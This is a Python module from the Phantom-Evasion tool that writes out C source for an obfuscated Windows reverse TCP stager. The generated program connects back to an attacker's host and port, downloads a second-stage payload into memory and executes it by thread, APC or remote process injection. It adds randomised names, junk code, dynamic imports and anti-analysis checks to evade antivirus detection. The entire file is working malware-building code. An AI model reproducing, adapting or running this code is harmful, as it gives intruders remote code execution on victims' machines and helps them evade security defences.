
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #    along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.          #
     #                                                                                      #
     ########################################################################################

import sys
sys.path.append("Modules/payloads/auxiliar")

import inject_utils

from usefull import EncryptionManager
from usefull import varname_creator
from usefull import JunkInjector
from usefull import WindowsDefend
#from usefull import WindowsDecoyProc
#from usefull import CloseDecoyProc
from usefull import Remote_methods
from usefull import IncludeShuffler
from usefull import WriteSource

def RevTcpStager_C_windows(ModOpt):

    Randvarsize = varname_creator()
    Randlpv = varname_creator()
    Randvar = varname_creator()
    Randversion = varname_creator()
    Randwsadata = varname_creator()
    Randtarget = varname_creator()
    Randsock = varname_creator()
    RandSocket = varname_creator()
    Randint = varname_creator()
    Randtret = varname_creator()
    Randnret = varname_creator()
    Randstartb = varname_creator()

    if ModOpt["Arch"] == "x86":

        ModOpt["Bufflen"] = Randvarsize + " + 5"
    else:
        ModOpt["Bufflen"] = Randvarsize + " + 10"

    Arch = ModOpt["Arch"]
    MemAlloc = ModOpt["MemAlloc"]
    ExecMethod = ModOpt["ExecMethod"]

    if ModOpt["MemAlloc"] in ["SharedSection","SS"]:

        ModOpt["Buff"] = Randlpv
        ModOpt["Lpvoid"] = varname_creator()
    else:
        ModOpt["Buff"] = Randlpv
        ModOpt["Lpvoid"] = Randlpv

    ModOpt["Decoder"] = "False"

    Ret_code = ""
    Ret_code += "#define _WIN32_WINNT 0x0500\n"
    Ret_code += "#include <winsock2.h>\n"

    Include_List = ["#include <stdlib.h>\n","#include <windows.h>\n","#include <stdio.h>\n","#include <string.h>\n","#include <time.h>\n","#include <math.h>\n","#include <tlhelp32.h>\n"]

    Ret_code += IncludeShuffler(Include_List)
    
    if ModOpt["Outformat"] == "exe":

        Ret_code += "int main(int argc,char * argv[]){\n"

    elif ModOpt["Outformat"] == "dll":

        if ModOpt["Reflective"] == True:

            Ret_code += "#include \"ReflectiveLoader.h\"\n"

        Ret_code += "BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD dwReason,LPVOID lpReserved){\n"
        Ret_code += "BOOL bReturnValue = TRUE;\n"
        Ret_code += "if(dwReason ==  DLL_PROCESS_ATTACH){\n"

    if ModOpt["DynImport"] == True:

        ModOpt["NtdllHandle"] = varname_creator()
        ModOpt["Ker32Handle"] = varname_creator()

        Ret_code += "HANDLE " + ModOpt["NtdllHandle"] + " = GetModuleHandle(\"ntdll.dll\");\n"
        Ret_code += "HANDLE " + ModOpt["Ker32Handle"] + " = GetModuleHandle(\"kernel32.dll\");\n"


    Ret_code += "$:START\n"

    Ret_code += WindowsDefend(ModOpt)

    #Ret_code += WindowsDecoyProc(ModOpt["DecoyProc"])

    Ret_code += "$:EVA\n"

    if ModOpt["Arch"] == "x86":

        Ret_code += "ULONG32 " + Randvarsize + ";\n"
    else:
        Ret_code += "ULONG64 " + Randvarsize + ";\n"

    Ret_code += "int " + Randvar + ";\n"
    Ret_code += "WORD " + Randversion + " = MAKEWORD(2,2);\n"
    Ret_code += "WSADATA " + Randwsadata + ";\n"

    if ModOpt["DynImport"] == True:

        ModOpt["NtdllHandle"] = varname_creator()
        ModOpt["Ker32Handle"] = varname_creator()
        WS2_32 = varname_creator()
        NdcWSAStartup = varname_creator()
        NdcWSACleanup = varname_creator() 
        Ret_code += "HANDLE " + ModOpt["NtdllHandle"] + " = GetModuleHandle(\"ntdll.dll\");\n"
        Ret_code += "HANDLE " + ModOpt["Ker32Handle"] + " = GetModuleHandle(\"kernel32.dll\");\n"
        Ret_code += "HANDLE " + WS2_32 + " = GetModuleHandle(\"ws2_32.dll\");\n"
        Ret_code += "FARPROC " + NdcWSAStartup + " = GetProcAddress(" + WS2_32 + ", \"WSAStartup\");\n"
        Ret_code += "FARPROC " + NdcWSACleanup + " = GetProcAddress(" + WS2_32 + ", \"WSACleanup\");\n"
        Ret_code += "if (" + NdcWSAStartup + "(" + Randversion + ", &" + Randwsadata + ") < 0){"
        Ret_code += NdcWSACleanup + "();exit(1);}\n"
    else:
        Ret_code += "if (WSAStartup(" + Randversion + ", &" + Randwsadata + ") < 0){"
        Ret_code += "WSACleanup();exit(1);}\n"

    Ret_code += "struct hostent * " + Randtarget + ";\n"
    Ret_code += "struct sockaddr_in " + Randsock + ";\n"
    Ret_code += "SOCKET " + RandSocket + " = socket(AF_INET, SOCK_STREAM, 0);\n"
    Ret_code += "if (" + RandSocket + " == INVALID_SOCKET){closesocket(" + RandSocket + ");WSACleanup();exit(1);}\n"
    Ret_code += Randtarget + " = gethostbyname(\"" + ModOpt["Lhost"] + "\");\n"     #Lhost
    Ret_code += "if (" + Randtarget + " == NULL){closesocket(" + RandSocket + ");WSACleanup();exit(1);}\n"
    Ret_code += "memcpy(&" + Randsock + ".sin_addr.s_addr, " + Randtarget + "->h_addr, " + Randtarget + "->h_length);\n"
    Ret_code += Randsock + ".sin_family = AF_INET;\n"
    Ret_code += Randsock + ".sin_port = htons((" + ModOpt["Lport"] + "));\n"        #Lport
    Ret_code += "if (connect(" + RandSocket + ",(struct sockaddr *)&" + Randsock + ",sizeof(" + Randsock + "))){closesocket(" + RandSocket + ");\n"

    if ModOpt["DynImport"] == True:

        Ret_code += NdcWSACleanup + "();exit(1);}\n"
        Ret_code += "int " + Randint + " = recv(" + RandSocket + ", (char *)&" + Randvarsize + ", 4, 0);\n"
        Ret_code += "if (" + Randint + " != (4) || " + Randvarsize + " <= 0) {closesocket(" + RandSocket + ");" + NdcWSACleanup + "();exit(1);}\n"
        Ret_code += "char * " + Randlpv + ";\n"
    else:
        Ret_code += "WSACleanup();exit(1);}\n"
        Ret_code += "int " + Randint + " = recv(" + RandSocket + ", (char *)&" + Randvarsize + ", 4, 0);\n"
        Ret_code += "if (" + Randint + " != (4) || " + Randvarsize + " <= 0) {closesocket(" + RandSocket + ");WSACleanup();exit(1);}\n"
        Ret_code += "char * " + Randlpv + ";\n"

    Ret_code += inject_utils.Win_MemLocal(ModOpt)

    if ModOpt["Arch"] == "x86":

        Ret_code += Randlpv + "[0] = 0xBF;\n"
        Ret_code += "memcpy(" + Randlpv + " + 1, &" + RandSocket + ",4);\n"
    else:
        Ret_code += Randlpv + "[0] = 0x48;\n"
        Ret_code += Randlpv + "[1] = 0xBF;\n"
        Ret_code += "memcpy(" + Randlpv + " + 2, &" + RandSocket + ",4);\n"
    
    Ret_code += "int " + Randtret + "=0;int " + Randnret + "=0;\n"

    if ModOpt["Arch"] == "x86":

        Ret_code += "void * " + Randstartb + " = " + Randlpv + " + 5;\n"
    else:
        Ret_code += "void * " + Randstartb + " = " + Randlpv + " + 10;\n" 

    Ret_code += "while (" + Randnret + " < " + Randvarsize + "){\n"
    Ret_code += Randtret + " = recv(" + RandSocket + ", (char *)" + Randstartb + ", " + Randvarsize + " - " + Randnret + ", 0);\n"
    Ret_code += Randstartb + " += " + Randtret + ";" + Randnret + " += " + Randtret + ";\n"

    if ModOpt["DynImport"] == True:
        Ret_code += "if (" + Randtret + " == SOCKET_ERROR) {closesocket(" + RandSocket + ");" + NdcWSACleanup + "();exit(1);}}\n"    
    else:
        Ret_code += "if (" + Randtret + " == SOCKET_ERROR) {closesocket(" + RandSocket + ");WSACleanup();exit(1);}}\n"
    
    Ret_code += Randint + " = " + Randnret + ";\n"

    if "RW/" in MemAlloc and ExecMethod in ["Thread","APC"] :

        Ret_code += inject_utils.Win_ChangeMemProtect(ModOpt)

    if  ModOpt["ExecMethod"] in ["Thread","APC"]:

        Ret_code += inject_utils.Win_LocalThread(ModOpt)
    else:    
        Ret_code += inject_utils.Win_RemoteInjection(ModOpt)

    Ret_code += "$:END\n"

    #Ret_code += CloseDecoyProc(ModOpt["DecoyProc"])

    Ret_code = JunkInjector(Ret_code,ModOpt["JI"],ModOpt["JF"],ModOpt["EF"],ModOpt["JR"])

    if ModOpt["Outformat"] == "exe":

        Ret_code += "return 0;}"

    elif ModOpt["Outformat"] == "dll":

        Ret_code += "}\n"
        Ret_code += "return bReturnValue;}\n"

    WriteSource("Source.c",Ret_code)

